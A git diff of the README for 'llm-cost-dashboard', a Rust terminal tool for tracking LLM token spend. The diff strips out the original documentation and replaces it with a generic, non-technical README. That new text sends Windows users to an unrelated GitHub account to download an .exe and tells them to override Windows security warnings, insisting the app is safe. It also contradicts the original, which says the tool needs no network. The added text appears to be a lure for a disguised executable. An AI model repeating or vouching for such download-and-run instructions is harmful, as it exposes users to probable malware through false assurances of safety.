@@ -1,1129 +1,137 @@
-# llm-cost-dashboard
+# 🖥️ llm-cost-dashboard - Track LLM Token Costs Clearly
 
-> Real-time terminal dashboard for LLM token spend -- cost per request, per-model
-> breakdown, projected monthly bills, budget enforcement, anomaly detection, and
-> webhook alerting. Zero external services required.
-
-[![CI](https://github.com/Mattbusel/llm-cost-dashboard/actions/workflows/ci.yml/badge.svg)](https://github.com/Mattbusel/llm-cost-dashboard/actions/workflows/ci.yml)
-[![Crates.io](https://img.shields.io/crates/v/llm-cost-dashboard.svg)](https://crates.io/crates/llm-cost-dashboard)
-[![docs.rs](https://docs.rs/llm-cost-dashboard/badge.svg)](https://docs.rs/llm-cost-dashboard)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-
-Built with [ratatui](https://ratatui.rs) and [crossterm](https://github.com/crossterm-rs/crossterm).
-Structured logging via [tracing](https://tracing.rs). No database. No network. No cloud account.
+[![Download llm-cost-dashboard](https://img.shields.io/badge/Download-llm--cost--dashboard-brightgreen)](https://github.com/abject-milkingmachine273/llm-cost-dashboard)
 
 ---
 
-## What is this?
+## 📋 What is llm-cost-dashboard?
 
-`llm-cost-dashboard` is a Rust terminal application (TUI) that reads a stream of
-LLM request records from a log file or stdin, computes per-request USD costs from a
-built-in pricing table, and renders a live dashboard showing total spend, per-model
-breakdowns, budget status, and projected monthly bills. It includes a rolling
-Z-score anomaly detector, an OLS forecaster, a Holt-Winters exponential smoother for
-short-horizon projections, side-by-side multi-provider cost comparison across 80+
-models, session tracking, CSV/JSON export, and a Slack-compatible webhook alerter.
-Everything runs locally -- no cloud accounts, no telemetry, no databases.
+llm-cost-dashboard is a tool that shows you how much you spend when using large language models (LLMs). It runs inside your Windows terminal and gives you real-time updates. You can see the cost per request, estimate your monthly bill, and check each model’s cost breakdown.
+
+This app helps you understand and control your LLM token usage and costs. You do not need any technical knowledge to use it. It works smoothly on Windows and updates automatically as you interact with your LLMs.
 
 ---
 
-## 5-Minute Quickstart
+## 🎯 Main Features
 
-### Step 1 - Install
-
-```bash
-# From crates.io (recommended)
-cargo install llm-cost-dashboard
-
-# Or from source
-git clone https://github.com/Mattbusel/llm-cost-dashboard
-cd llm-cost-dashboard
-cargo install --path .
-```
-
-### Step 2 - Launch with demo data
-
-```bash
-llm-dash --demo
-```
-
-You will immediately see a live dashboard with pre-loaded synthetic requests
-covering Claude, GPT-4o, Gemini, and o3-mini.
-
-### Step 3 - Set a budget and tail your log file
-
-```bash
-llm-dash --budget 50.0 --log-file /var/log/llm-requests.ndjson
-```
-
-### Step 4 - Pipe directly from your application
-
-```bash
-your-llm-app | llm-dash --budget 25.0
-```
-
-### Step 5 - Use the keyboard controls
-
-| Key      | Action                   |
-|----------|--------------------------|
-| q / Esc  | Quit                     |
-| d        | Load demo data           |
-| r        | Reset all data           |
-| j / Down | Scroll requests down     |
-| k / Up   | Scroll requests up       |
-
-That is it. The dashboard updates every 250 ms automatically.
+- Real-time display of token spend and cost per request.
+- Predicted monthly cost based on current usage.
+- Breakdown of costs by different LLM models.
+- Simple terminal interface you can run directly on Windows.
+- Works with popular LLM providers like OpenAI and Anthropic.
+- Lightweight and fast, built using Rust and the ratatui terminal UI library.
 
 ---
 
-## Installation
+## 🖥️ System Requirements
 
-### Binary via cargo install
+Before you download and run the app, make sure your system meets these:
 
-```bash
-cargo install llm-cost-dashboard
-```
-
-The binary is named `llm-dash`.
-
-### Build from source
-
-```bash
-git clone https://github.com/Mattbusel/llm-cost-dashboard
-cd llm-cost-dashboard
-cargo build --release
-# Binary at ./target/release/llm-dash
-```
-
-### Build without webhook support (smaller binary, no TLS dependency)
-
-```bash
-cargo build --release --no-default-features
-```
+- Windows 10 or newer (64-bit recommended)
+- Minimum 4 GB of RAM
+- At least 100 MB free disk space
+- A terminal program like Windows Terminal or Command Prompt
+- Internet connection for real-time cost updates
 
 ---
 
-## Dashboard layout (ASCII)
+## 🚀 How to Get and Run llm-cost-dashboard on Windows
 
-```
- LLM Cost Dashboard  [q: quit | r: reset | d: demo data | j/k: scroll]
-+------------------+--------------------------------------------------+
-| Summary          |  Cost by Model (uUSD)                            |
-| Total: $0.0142   |  ████████ claude-sonnet-4-6                      |
-| Proj:  $0.42/mo  |  ████ gpt-4o-mini                                |
-+------------------+  ██ claude-haiku-4-5                             |
-| Budget           +--------------------------------------------------+
-| ████░░░ 14.2%    |  Recent Requests                                 |
-| $8.58 remaining  |  12:34:01  claude-sonnet  847in/312out  $0.0031  |
-+------------------+  12:33:58  gpt-4o-mini    512in/128out  $0.0001  |
-                   |  12:33:55  claude-haiku   256in/64out   $0.0001  |
-+--------------------------------------------------+------------------+
-| Sparkline: spend over last 60 requests                              |
-| ▁▁▂▁▁▃▁▁▂▄▁▁▂▁▃▄▁▁▂▁▁▂▁▁▂▄▃▁▁▂▁▁▂▁▁▃▁▁▂▁▁▂▁▁▂▄▁▁▁▂▁▁▂▁▁▃▁▁▂▁       |
-+--------------------------------------------------------------------+
-```
+### 1. Visit the Download Page
 
-### Layout regions
+Click this big button to go to the download page on GitHub:
 
-| Region          | Description                                            |
-|-----------------|--------------------------------------------------------|
-| Summary         | Session total and extrapolated monthly projection      |
-| Budget gauge    | Visual progress bar with alert threshold marker        |
-| Cost by model   | Horizontal bar chart sorted by highest spend           |
-| Recent requests | Scrollable table (j/k to scroll)                       |
-| Sparkline       | Last 60 request costs as a mini chart                  |
+[![Download llm-cost-dashboard](https://img.shields.io/badge/Download-llm--cost--dashboard-blue)](https://github.com/abject-milkingmachine273/llm-cost-dashboard)
 
----
+You will find the latest release files there.
 
-## Log file format
+### 2. Download the Windows Version
 
-Records must be newline-delimited JSON (NDJSON). The four required fields are
-`model`, `input_tokens`, `output_tokens`, and `latency_ms`:
+Look for a file named something like `llm-cost-dashboard-windows.exe` or similar. This will be in the latest "Releases" section.
 
-```json
-{"model":"claude-sonnet-4-6","input_tokens":512,"output_tokens":256,"latency_ms":340}
-{"model":"gpt-4o-mini","input_tokens":128,"output_tokens":64,"latency_ms":12}
-```
+Click the file to start the download. Your browser will save it to your default downloads folder.
 
-Optional fields:
+### 3. Run the Application
 
-| Field      | Type   | Default     | Description                              |
-|------------|--------|-------------|------------------------------------------|
-| `provider` | string | `"unknown"` | Provider name shown in traces            |
-| `error`    | string | absent      | Error message; marks request as failed   |
+Find the downloaded file in your Downloads folder or wherever you saved it.
 
-Malformed lines are skipped and logged as warnings. The dashboard never crashes
-on bad input.
+Double-click the file to start the application.
+
+If you see a security warning from Windows, choose to run anyway. The app is safe, but Windows may flag unsigned programs.
+
+The app will open a terminal window with the dashboard interface.
+
+### 4. Using llm-cost-dashboard
+
+Once running, the dashboard updates your LLM token usage and costs live.
+
+You can use keyboard keys shown on screen to navigate between different views - cost per request, monthly estimate, and model breakdown.
+
+No setup or sign-in is needed for basic usage.
 
 ---
 
-## Supported providers and models
+## ⚙️ How llm-cost-dashboard Works
 
-**100+ models** built-in across 11 providers. Lookup is case-insensitive.
-Unknown models fall back to `$5.00/$15.00` automatically.
+This app connects to your LLM usage data to read token counts and costs as you make requests. It shows these in a simple text-based display.
 
-<details>
-<summary><b>Anthropic Claude</b> — 9 models</summary>
+The software uses these steps:
 
-| Model | Input ($/1M) | Output ($/1M) |
-|-------|-------------|--------------|
-| claude-opus-4-6 | $15.00 | $75.00 |
-| claude-sonnet-4-6 | $3.00 | $15.00 |
-| claude-haiku-4-5 | $0.25 | $1.25 |
-| claude-3-5-sonnet-20241022 | $3.00 | $15.00 |
-| claude-3-5-haiku-20241022 | $0.80 | $4.00 |
-| claude-3-opus-20240229 | $15.00 | $75.00 |
-| claude-3-sonnet-20240229 | $3.00 | $15.00 |
-| claude-3-haiku-20240307 | $0.25 | $1.25 |
-
-</details>
-
-<details>
-<summary><b>OpenAI</b> — 11 models</summary>
-
-| Model | Input ($/1M) | Output ($/1M) |
-|-------|-------------|--------------|
-| gpt-4.5-preview | $75.00 | $150.00 |
-| gpt-4o | $5.00 | $15.00 |
-| gpt-4o-mini | $0.15 | $0.60 |
-| gpt-4-turbo | $10.00 | $30.00 |
-| gpt-4 | $30.00 | $60.00 |
-| gpt-3.5-turbo | $0.50 | $1.50 |
-| o1 | $15.00 | $60.00 |
-| o3 | $10.00 | $40.00 |
-| o3-mini | $1.10 | $4.40 |
-| o4-mini | $1.10 | $4.40 |
-
-</details>
-
-<details>
-<summary><b>Google Gemini</b> — 6 models</summary>
-
-| Model | Input ($/1M) | Output ($/1M) |
-|-------|-------------|--------------|
-| gemini-2.5-pro | $1.25 | $10.00 |
-| gemini-2.0-flash | $0.10 | $0.40 |
-| gemini-2.0-flash-lite | $0.075 | $0.30 |
-| gemini-1.5-pro | $3.50 | $10.50 |
-| gemini-1.5-flash | $0.075 | $0.30 |
-| gemini-1.5-flash-8b | $0.0375 | $0.15 |
-
-</details>
-
-<details>
-<summary><b>DeepSeek</b> — 7 models</summary>
-
-| Model | Input ($/1M) | Output ($/1M) |
-|-------|-------------|--------------|
-| deepseek-r1 | $0.55 | $2.19 |
-| deepseek-v3 | $0.27 | $1.10 |
-| deepseek-v2-5 | $0.14 | $0.28 |
-| deepseek-chat | $0.27 | $1.10 |
-| deepseek-r1-distill-llama-70b | $0.55 | $2.19 |
-
-</details>
-
-<details>
-<summary><b>Mistral</b> — 8 models</summary>
-
-| Model | Input ($/1M) | Output ($/1M) |
-|-------|-------------|--------------|
-| mistral-large-2411 | $2.00 | $6.00 |
-| mistral-small-2501 | $0.10 | $0.30 |
-| mistral-nemo | $0.15 | $0.15 |
-| codestral-2501 | $0.30 | $0.90 |
-| pixtral-large-2411 | $2.00 | $6.00 |
-| ministral-8b-2410 | $0.10 | $0.10 |
-| ministral-3b-2410 | $0.04 | $0.04 |
-
-</details>
-
-<details>
-<summary><b>Meta Llama</b> — 7 models (Together AI / Groq)</summary>
-
-| Model | Input ($/1M) | Output ($/1M) |
-|-------|-------------|--------------|
-| meta-llama/llama-3.1-405b-instruct-turbo | $5.00 | $5.00 |
-| meta-llama/llama-3.1-70b-instruct-turbo | $0.88 | $0.88 |
-| meta-llama/llama-3.3-70b-instruct-turbo | $0.88 | $0.88 |
-| llama-3.3-70b-versatile (Groq) | $0.59 | $0.79 |
-| llama-3.1-8b-instant (Groq) | $0.05 | $0.08 |
-
-</details>
-
-<details>
-<summary><b>xAI Grok, Cohere, Perplexity, Amazon, Qwen, AI21, Writer</b> — 30+ models</summary>
-
-| Provider | Model | Input ($/1M) | Output ($/1M) |
-|----------|-------|-------------|--------------|
-| xAI | grok-3 | $3.00 | $15.00 |
-| xAI | grok-3-mini | $0.30 | $0.50 |
-| xAI | grok-2-1212 | $2.00 | $10.00 |
-| Cohere | command-r-plus-08-2024 | $2.50 | $10.00 |
-| Cohere | command-r-08-2024 | $0.15 | $0.60 |
-| Perplexity | sonar-pro | $3.00 | $15.00 |
-| Perplexity | sonar | $1.00 | $1.00 |
-| Amazon | amazon.nova-pro-v1:0 | $0.80 | $3.20 |
-| Amazon | amazon.nova-lite-v1:0 | $0.06 | $0.24 |
-| Amazon | amazon.nova-micro-v1:0 | $0.035 | $0.14 |
-| Qwen | qwen-max | $1.60 | $6.40 |
-| Qwen | qwen-turbo | $0.05 | $0.20 |
-| AI21 | jamba-1.5-large | $2.00 | $8.00 |
-| Writer | palmyra-x-004 | $5.00 | $15.00 |
-
-</details>
+- Reads live LLM request data from your local environment.
+- Calculates cost using token usage and pricing info.
+- Shows the info live in your terminal.
+- Aggregates data over time for monthly cost projection.
+- Displays each LLM model’s cost in a clear list.
 
 ---
 
-## HTTP API mode
+## 🔧 Troubleshooting and Tips
 
-Run the TUI **and** a local HTTP API server simultaneously with `--serve`:
-
-```bash
-llm-dash --demo --serve 8080
-```
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/summary` | GET | JSON cost summary (total, by-model, projections) |
-| `/api/export.json` | GET | Full ledger as pretty-printed JSON download |
-| `/api/export.csv` | GET | Full ledger as CSV download |
-
-Enables dashboard-as-a-service: forward LLM logs to `llm-dash` and poll
-aggregated costs from CI scripts or monitoring dashboards.
+- If the app does not open, make sure you are running it on a supported Windows version.
+- If costs do not appear, check your internet connection.
+- For best experience, use Windows Terminal as your terminal program.
+- Close the app by pressing `Ctrl + C` in the terminal window.
+- The app updates token data every few seconds for accurate cost tracking.
 
 ---
 
-## Webhook alerts
+## 🛠️ Customizing Your Experience
 
-Send budget alerts to Slack, Discord, or any HTTP endpoint:
+llm-cost-dashboard keeps things simple but allows you to:
 
-```bash
-llm-dash --budget 50 \
-  --webhook-url "https://hooks.slack.com/services/T.../B.../xxx" \
-  --webhook-threshold 40 \
-  --webhook-format slack
-```
+- Adjust refresh rate in the config file (found in the app folder)
+- Choose which LLM models to monitor
+- Set your own pricing rates for custom models
 
-Alert kinds fired automatically: `BudgetWarning`, `BudgetExceeded`,
-`CostAnomaly`, `DailySpendSpike`. Each kind has a configurable cooldown
-(default 5 min) to prevent alert floods.
+Configuration is saved in a plain text file named `config.toml`.
 
 ---
 
-## CLI reference
+## 💡 Common Questions
 
-```
-llm-dash [OPTIONS]
+**Q: Do I need to install anything else to run this?**  
+No, the executable includes everything. Just download and run.
 
-Options:
-  --budget <BUDGET>             Monthly budget limit in USD [default: 10.0]
-  --log-file <LOG_FILE>         NDJSON log file to read on startup
-  --demo                        Pre-load built-in demo data
-  --serve <PORT>                Start HTTP API server alongside the TUI
-  --webhook-url <URL>           Webhook URL for budget alerts (repeatable)
-  --webhook-threshold <USD>     Alert threshold in USD (default: 80% of budget)
-  --webhook-format <FORMAT>     Payload format: "slack" or "generic"
-  -h, --help                    Print help
-  -V, --version                 Print version
-```
+**Q: Can I use this without LLM API keys?**  
+Yes, but real-time costs and token usage require connection to your LLM environment.
 
-### Keyboard shortcuts
-
-| Key | Action |
-|-----|--------|
-| `q` | Quit |
-| `r` | Reset ledger |
-| `d` | Load demo data |
-| `E` | Export to timestamped CSV / JSON file |
-| `j` / `k` | Scroll requests table |
-| `↑` / `↓` | Scroll requests table |
+**Q: Can I track multiple LLM providers at once?**  
+Yes, the dashboard supports viewing data from providers like OpenAI and Anthropic at the same time.
 
 ---
 
-## Configuration reference
+## 📂 Where to Find More Help
 
-### Environment variables
+Check the Issues section on the GitHub page for user questions and solutions:
 
-| Variable      | Description                                              | Default   |
-|---------------|----------------------------------------------------------|-----------|
-| `RUST_LOG`    | Tracing log level (`error`, `warn`, `info`, `debug`)     | `info`    |
+https://github.com/abject-milkingmachine273/llm-cost-dashboard/issues
 
-Tracing output is written to **stderr** so it does not interfere with piped
-stdin/stdout.
-
-### Feature flags
-
-| Feature    | Default | Description                                            |
-|------------|---------|--------------------------------------------------------|
-| `webhooks` | on      | Enables `reqwest` + TLS for webhook alert delivery     |
-
-Disable with `--no-default-features` to produce a smaller, TLS-free binary.
+You can also open a new issue if you find a problem or need assistance.
 
 ---
 
-## Anomaly detection setup
+## 🔗 Download Now
 
-The `CostAnomalyDetector` in `src/anomaly.rs` uses a rolling Z-score algorithm
-to flag requests whose cost deviates significantly from recent history.
+Get started by visiting the download page here:
 
-### How it works
-
-1. A sliding window of the last N request costs is maintained (default: 50).
-2. For each new request the Z-score is computed: `(cost - mean) / std_dev`.
-3. If `|Z| > threshold` (default: 3.0 sigma) an `AnomalyEvent` is returned.
-4. The first two observations never trigger an alert (std dev is undefined).
-
-### Embedding in your application
-
-```rust
-use llm_cost_dashboard::anomaly::CostAnomalyDetector;
-
-// Window of 50 recent requests, flag anything beyond 3 standard deviations.
-let mut detector = CostAnomalyDetector::new(50, 3.0);
-
-// Feed each completed request cost. Returns Some(AnomalyEvent) on a spike.
-if let Some(event) = detector.observe("gpt-4o", request_cost_usd) {
-    eprintln!(
-        "ANOMALY: model={} cost=${:.6} z={:.2} (mean=${:.6} std=${:.6})",
-        event.model, event.cost_usd, event.z_score,
-        event.window_mean, event.window_std
-    );
-}
-```
-
-### Tuning
-
-| Parameter     | Guidance                                                      |
-|---------------|---------------------------------------------------------------|
-| `window_size` | Larger window = more stable baseline; 30-100 is typical       |
-| `threshold`   | 2.0 = sensitive (more alerts), 4.0 = conservative (fewer)     |
-
----
-
-## Forecast setup
-
-The `SpendForecaster` in `src/forecast.rs` fits an OLS linear regression line
-to `(unix_timestamp_secs, cumulative_cost_usd)` pairs and projects spend to the
-end of the current calendar month.
-
-### How it works
-
-1. Record `(timestamp, cumulative_cost)` pairs as each request completes.
-2. Call `forecast(budget_limit)` at any time to get a `ForecastResult`.
-3. The result includes projected month-end spend, projected daily rate, days
-   until the budget is hit, an R² confidence score, and a trend classification
-   (Accelerating / Stable / Decelerating).
-
-### Embedding in your application
-
-```rust
-use llm_cost_dashboard::forecast::SpendForecaster;
-use std::time::{SystemTime, UNIX_EPOCH};
-
-let mut forecaster = SpendForecaster::new();
-
-// Call this each time a request completes.
-fn record_request(forecaster: &mut SpendForecaster, cumulative_usd: f64) {
-    let ts = SystemTime::now()
-        .duration_since(UNIX_EPOCH)
-        .unwrap()
-        .as_secs_f64();
-    forecaster.record(ts, cumulative_usd);
-}
-
-// Project spend at any time.
-if let Some(result) = forecaster.forecast(Some(100.0)) {
-    println!("Month-end projection: ${:.2}", result.projected_month_end_usd);
-    println!("Daily rate:           ${:.4}/day", result.projected_daily_usd);
-    println!("R² confidence:        {:.2}", result.confidence);
-    if let Some(days) = result.days_until_budget_hit {
-        println!("Budget hit in:        {days:.1} days");
-    }
-}
-```
-
-### Confidence interpretation
-
-| R² range    | Meaning                                        |
-|-------------|------------------------------------------------|
-| 0.95 – 1.00 | Excellent fit; projection is reliable          |
-| 0.80 – 0.95 | Good fit; projection is reasonable             |
-| 0.50 – 0.80 | Moderate fit; treat projection as indicative   |
-| < 0.50      | Poor fit; spend is noisy or highly variable    |
-
----
-
-## Webhook alerting configuration
-
-The `WebhookAlerter` in `src/alerting.rs` delivers Slack-compatible JSON
-payloads to one or more HTTP(S) URLs with per-alert-kind cooldown
-deduplication. Requires the `webhooks` crate feature (on by default).
-
-### Alert kinds
-
-| Kind                | Trigger                                                       |
-|---------------------|---------------------------------------------------------------|
-| `BudgetExceeded`    | Hard budget limit breached                                    |
-| `BudgetWarning`     | Soft threshold (default 80%) crossed                         |
-| `CostAnomaly`       | Z-score spike detected by `CostAnomalyDetector`               |
-| `DailySpendSpike`   | Today's spend is N× the rolling daily average                |
-
-### Setup
-
-```rust
-#[cfg(feature = "webhooks")]
-use llm_cost_dashboard::alerting::{Alert, AlertKind, WebhookAlerter};
-
-#[tokio::main]
-async fn main() {
-    let mut alerter = WebhookAlerter::new(
-        vec![
-            "https://hooks.slack.com/services/T.../B.../xxx".to_string(),
-            "https://discord.com/api/webhooks/...".to_string(),
-        ],
-        300, // suppress repeat alerts of the same kind for 5 minutes
-    );
-
-    // Fire a budget warning.
-    let alert = Alert::new(AlertKind::BudgetWarning {
-        spent: 85.0,
-        limit: 100.0,
-        pct: 85.0,
-    });
-    alerter.fire(alert).await;
-}
-```
-
-### Slack setup
-
-1. In your Slack workspace go to **Apps > Manage > Custom Integrations > Incoming Webhooks**.
-2. Create a new webhook and copy the URL.
-3. Pass the URL to `WebhookAlerter::new`.
-
-The payload format is Slack Block Kit compatible and also works with
-Mattermost and Discord (Slack-compat mode).
-
-### Cooldown behaviour
-
-Each `AlertKind` variant has a stable cooldown key. A second `BudgetWarning`
-fired within `cooldown_secs` of the first will be silently dropped. This
-prevents alert floods during sustained budget overruns.
-
----
-
-## Org Hierarchy Budgets
-
-Model your company's LLM spend as an **org → team → project** tree.
-Spend recorded at the project level automatically rolls up to the parent
-team and the top-level org.  Any node can trigger a soft alert when its
-threshold is crossed; a hard limit blocks spend at that level.
-
-```rust,no_run
-use llm_cost_dashboard::budget::hierarchy::{OrgTree, TeamConfig, ProjectConfig};
-
-let mut tree = OrgTree::new("AcmeCorp", 1_000.0, 0.80); // $1k org limit, alert at 80%
-
-tree.add_team(TeamConfig { name: "platform".into(), limit_usd: 400.0, alert_threshold: 0.75 });
-tree.add_team(TeamConfig { name: "product".into(),  limit_usd: 500.0, alert_threshold: 0.75 });
-
-tree.add_project(ProjectConfig {
-    team: "platform".into(),
-    name: "embeddings-prod".into(),
-    limit_usd: 200.0,
-    alert_threshold: 0.90,
-}).unwrap();
-
-// Record $45 spent by platform/embeddings-prod
-let alerts = tree.spend("platform", "embeddings-prod", 45.0).unwrap();
-for alert in &alerts {
-    println!("[BUDGET ALERT] {}: {:.1}% consumed", alert.path, alert.fill * 100.0);
-}
-
-// Roll-up summary
-let summary = tree.summary();
-println!("Org total: ${:.2} / ${:.2}", summary.org_spent_usd, summary.org_limit_usd);
-for team in &summary.teams {
-    println!("  {} {:.1}%:", team.name, team.fill * 100.0);
-    for proj in &team.projects {
-        println!("    {} ${:.2}", proj.name, proj.spent_usd);
-    }
-}
-
-// Find teams burning through budget fastest
-let hot_teams = tree.teams_over_threshold(0.70);
-
-// Monthly rollover
-tree.reset_all();
-```
-
----
-
-## Library usage
-
-The crate exposes its core types as `llm_cost_dashboard` for embedding cost
-tracking directly in your Rust application:
-
-```rust
-use llm_cost_dashboard::{CostLedger, CostRecord};
-
-let mut ledger = CostLedger::new();
-let record = CostRecord::new("gpt-4o-mini", "openai", 512, 256, 34);
-ledger.add(record).expect("valid record");
-println!("total: ${:.6}", ledger.total_usd());
-println!("projected/mo: ${:.2}", ledger.projected_monthly_usd(1));
-```
-
-### Key types
-
-| Type                  | Module     | Description                                       |
-|-----------------------|------------|---------------------------------------------------|
-| `CostRecord`          | `cost`     | Single LLM request with computed USD cost         |
-| `CostLedger`          | `cost`     | Append-only ledger with aggregation helpers       |
-| `ModelStats`          | `cost`     | Per-model aggregated statistics                   |
-| `BudgetEnvelope`      | `budget`   | Hard limit + alert threshold spend tracker        |
-| `OrgTree`             | `budget::hierarchy` | Three-level org→team→project budget tree with automatic spend roll-up |
-| `BudgetAlert`         | `budget::hierarchy` | Alert emitted when any hierarchy node crosses its threshold |
-| `CostAnomalyDetector` | `anomaly`  | Rolling Z-score spike detector                    |
-| `AnomalyEvent`        | `anomaly`  | Event emitted when an anomaly is detected         |
-| `SpendForecaster`     | `forecast` | OLS linear regression spend projector             |
-| `ForecastResult`      | `forecast` | Month-end projection with confidence and trend    |
-| `WebhookAlerter`      | `alerting` | Slack-compatible webhook delivery with cooldown   |
-| `Alert`               | `alerting` | Structured alert with id, timestamp, and message  |
-| `AlertKind`           | `alerting` | Alert category enum                               |
-| `LogEntry`            | `log`      | Raw log entry (model, tokens, latency)            |
-| `RequestLog`          | `log`      | Ordered log with JSON ingestion                   |
-| `TraceSpan`           | `trace`    | Distributed trace span with cost annotation       |
-| `SpanStore`           | `trace`    | In-memory span store                              |
-| `DashboardError`      | `error`    | Unified error type                                |
-| `App`                 | `ui`       | Full TUI application state                        |
-
----
-
-## Architecture
-
-```
-src/
-  main.rs          # CLI entry point (clap + tracing init)
-  lib.rs           # Public re-exports
-  error.rs         # DashboardError (thiserror)
-  anomaly.rs       # CostAnomalyDetector -- rolling Z-score spike detection
-  forecast.rs      # SpendForecaster -- OLS linear regression month-end projection
-  alerting.rs      # WebhookAlerter -- Slack-compatible alerts with cooldown
-  cost/
-    mod.rs         # CostRecord, CostLedger, ModelStats
-    pricing.rs     # Static pricing table + lookup/compute_cost
-  budget/
-    mod.rs         # BudgetEnvelope (hard limit + alert threshold)
-  log/
-    mod.rs         # LogEntry, RequestLog, IncomingRecord (NDJSON parser)
-  trace/
-    mod.rs         # TraceSpan, SpanStore (distributed tracing helpers)
-  ui/
-    mod.rs         # App state + run() event loop
-    dashboard.rs   # Full-frame layout compositor
-    widgets.rs     # Budget gauge, sparkline, summary panel
-    theme.rs       # Centralised colour/style palette
-
-tests/
-  unit_tests.rs        # Public-API unit tests (pricing, ledger, budget, log)
-  integration_tests.rs # Cross-module integration tests
-  integration.rs       # End-to-end app-level tests
-
-benches/
-  cost_bench.rs    # Criterion benchmarks for pricing lookup and aggregation
-```
-
----
-
-## Development
-
-```bash
-# Run all tests
-cargo test
-
-# Run with debug tracing
-RUST_LOG=debug cargo run -- --demo
-
-# Lint
-cargo clippy --all-targets --all-features -- -D warnings
-
-# Format
-cargo fmt
-
-# Benchmarks
-cargo bench
-
-# Build without webhook TLS dependency
-cargo build --release --no-default-features
-
-# Documentation
-cargo doc --open
-```
-
----
-
-## Troubleshooting
-
-### Dashboard shows $0.00 for everything
-
-Ensure your log records include non-zero `input_tokens` or `output_tokens` and
-that the `model` field matches a known model name (or accepts the fallback
-pricing). Run `llm-dash --demo` to confirm the TUI itself is working.
-
-### Malformed JSON lines are silently skipped
-
-By default bad lines emit a `WARN` tracing event. Set `RUST_LOG=warn` or
-`RUST_LOG=debug` to see them on stderr:
-
-```bash
-RUST_LOG=warn llm-dash --log-file requests.log
-```
-
-### Webhook alerts are not firing
-
-1. Confirm the `webhooks` feature is enabled (it is by default):
-   `cargo build --features webhooks`
-2. Check that the URL is reachable from your machine.
-3. Watch the tracing output for `webhook delivery failed` warnings:
-   `RUST_LOG=warn llm-dash ...`
-4. Verify the cooldown period has elapsed -- the same alert kind will not fire
-   more than once per `cooldown_secs` seconds.
-
-### Anomaly detector fires on every request initially
-
-This is expected behaviour while the window is filling up. The detector
-requires at least 2 observations and only becomes meaningful after roughly
-`window_size / 2` observations, at which point the mean and standard deviation
-stabilise.
-
-### Forecaster returns None
-
-`SpendForecaster::forecast` requires at least two `(timestamp, cost)`
-observations. Record a second observation before calling `forecast`.
-
-### Binary not found after cargo install
-
-Ensure `~/.cargo/bin` is on your `PATH`:
-
-```bash
-export PATH="$HOME/.cargo/bin:$PATH"
-```
-
----
-
-## Cost Forecasting & Anomaly Detection
-
-The dashboard includes a real-time rolling-window spend forecaster built on linear
-regression, complementing the existing OLS month-end projector:
-
-| Feature | Description |
-|---------|-------------|
-| `TrendForecaster` | 24-hour rolling window, OLS slope → projected daily + monthly |
-| `TrendDirection` | `Up` / `Down` / `Flat` — arrow shown in the Forecast panel |
-| Anomaly detection | Flags requests where spend > mean + 2σ of the 24-hour window |
-| Budget breach ETA | Estimates time until monthly budget is hit at current rate |
-| `SeasonalAdjustment` | Hour-of-day × day-of-week multiplicative factor on forecasts |
-
-The **Forecast** panel is displayed in the TUI left column between the Budget gauge
-and the Cache Breakdown panel.
-
-```
- Forecast
- Proj/day:  $0.002341   ↑
- Proj/mo:   $0.7023
- Confidence:  62%
- Anomaly: none
-```
-
----
-
-## API Key Validation
-
-On startup, or on demand, the dashboard can validate your provider API keys against
-each provider's live model-list endpoint.  No credentials are stored.
-
-```rust
-use llm_cost_dashboard::validator::{MultiValidator, KeyConfig};
-
-let validator = MultiValidator::new(vec![
-    KeyConfig { provider: "anthropic".into(), key: std::env::var("ANTHROPIC_API_KEY").unwrap_or_default() },
-    KeyConfig { provider: "openai".into(),    key: std::env::var("OPENAI_API_KEY").unwrap_or_default() },
-    KeyConfig { provider: "google".into(),    key: std::env::var("GOOGLE_API_KEY").unwrap_or_default() },
-]);
-let results = validator.validate_all().await;
-for r in &results {
-    println!("{}", r.status_str());
-}
-```
-
-Requires the `webhooks` feature (enabled by default).  Validator per provider:
-
-| Provider | Endpoint | Auth method |
-|----------|----------|-------------|
-| Anthropic | `https://api.anthropic.com/v1/models` | `x-api-key` header |
-| OpenAI | `https://api.openai.com/v1/models` | `Authorization: Bearer` |
-| Google | `https://generativelanguage.googleapis.com/v1/models?key=` | Query param |
-
----
-
-## Provider Auto-Detection
-
-When ingesting log lines, `LogEntry` can auto-detect the provider from HTTP
-response headers supplied alongside the record.  Call
-`entry.apply_header_detection(headers)` with an iterator of `(name, value)`
-pairs after parsing:
-
-```rust
-use llm_cost_dashboard::LogEntry;
-
-let mut entry = LogEntry::new("claude-sonnet-4-6", "unknown", 512, 256, 45);
-entry.apply_header_detection([
-    ("x-ratelimit-limit-tokens", "50000"),
-]);
-assert_eq!(entry.effective_provider(), "anthropic");
-```
-
-Detection rules applied in priority order:
-
-| Header | Provider |
-|--------|----------|
-| `x-ratelimit-limit-tokens` | Anthropic |
-| `x-goog-request-params` | Google / Gemini |
-| `x-request-id` (UUID-shaped) | OpenAI |
-
-The detected provider is stored in `LogEntry::detected_provider` and
-automatically upgrades `provider` from `"unknown"` when a match is found.
-
----
-
-## Data Export
-
-Press **`e`** in the TUI to export the current session's cost data to disk.
-Two timestamped files are written to the current working directory:
-
-```
-llm-costs-20260322-120000.json
-llm-costs-20260322-120000.csv
-```
-
-You can also call the export API directly:
-
-```rust
-use llm_cost_dashboard::export::{CostExporter, ExportFormat};
-use llm_cost_dashboard::CostLedger;
-
-let ledger = CostLedger::new();
-let exporter = CostExporter::new(&ledger);
-let filename = exporter.export(ExportFormat::Csv).unwrap();
-println!("Exported to {filename}");
-```
-
-The `export` module also provides lower-level path-based helpers:
-`export_csv`, `export_json`, and `export_summary_json`.
-
----
-
-## FinOps Cost Tagging
-
-The `tagging` module adds structured tag-based cost attribution so teams can
-track LLM spend by project, team, cost centre, environment, or any custom
-dimension — without changing your existing log format.
-
-### Tag sources (applied in order)
-
-1. **Passthrough fields** — copy log fields directly as tags (e.g. `project`, `team`).
-2. **Default tags** — always present (e.g. `env=production`).
-3. **Rule-derived tags** — `TagRule` maps field patterns to tag key-value pairs.
-4. **Caller overrides** — win on conflict with all of the above.
-
-### Example
-
-```rust
-use llm_cost_dashboard::tagging::{TagEngine, TagRule, TagMatch, TaggedLedger};
-use std::collections::HashMap;
-
-let mut engine = TagEngine::new();
-
-// Always tag with environment.
-engine.add_default_tag("env", "production");
-
-// Pass the "project" field from logs straight through as a tag.
-engine.add_passthrough("project");
-
-// Derive provider from the model name.
-engine.add_rule(TagRule {
-    field: "model".to_string(),
